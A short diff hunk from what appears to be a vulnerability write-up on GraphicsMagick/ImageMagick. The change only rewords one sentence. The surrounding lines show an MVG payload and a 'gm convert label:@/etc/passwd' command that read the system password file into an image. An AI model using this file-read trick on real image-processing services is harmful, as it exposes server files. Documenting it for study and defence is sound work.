@@ -20,7 +20,7 @@ image over 0,0 0,0 'label:@/etc/passwd'
 pop graphic-context
 ```
 
-Library will return error `Unable to open file` but what if we will change exploit to use another coder `label`? 
+Library will return error `Unable to open file` but what if we will change coder to `label`? 
 
 ```bash
 gm convert label:@/etc/passwd output.png
